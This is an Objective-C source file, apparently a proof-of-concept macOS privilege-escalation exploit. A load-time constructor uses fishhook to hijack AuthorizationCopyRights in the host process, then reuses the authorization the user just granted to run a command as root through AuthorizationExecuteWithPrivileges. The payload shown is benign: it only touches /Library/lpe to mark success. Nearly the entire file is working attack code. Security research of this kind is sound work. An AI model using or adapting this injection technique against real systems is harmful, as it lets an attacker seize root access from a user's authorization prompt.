//
//  main.m
//  fishhook
//
//  Created by mickey on 2022/8/5.
//

#include "fishhook.h"
#import <Security/Security.h>
#import <Foundation/Foundation.h>

static OSStatus (* ori_AuthorizationCopyRights)(AuthorizationRef authorization,
    const AuthorizationRights *rights,
    const AuthorizationEnvironment * __nullable environment,
    AuthorizationFlags flags,
    AuthorizationRights * __nullable * __nullable authorizedRights);

OSStatus my_AuthorizationCopyRights(AuthorizationRef authorization,
    const AuthorizationRights *rights,
    const AuthorizationEnvironment * __nullable environment,
    AuthorizationFlags flags,
                                 AuthorizationRights * __nullable * __nullable authorizedRights) {
    OSStatus status = ori_AuthorizationCopyRights(authorization, rights, environment, flags, authorizedRights);
    NSLog(@"got authorization:%p from AuthorizationCopyRights, status:%d", authorization, status);
    
    NSLog(@"Now run payload with root privileges");
    char *args[] = {"/Library/lpe", NULL};
    AuthorizationExecuteWithPrivileges(authorization, "/usr/bin/touch", 0, args, NULL);
    
    return status;
}

__attribute__((constructor)) void main_entry (void) {
    struct rebinding imp;
    imp.name = "AuthorizationCopyRights";
    imp.replacement = my_AuthorizationCopyRights;
    imp.replaced = (void *)&ori_AuthorizationCopyRights;
    struct rebinding rebs[1] = {imp};
    rebind_symbols(rebs, 1);
    NSLog(@"fishhook loaded.");
}
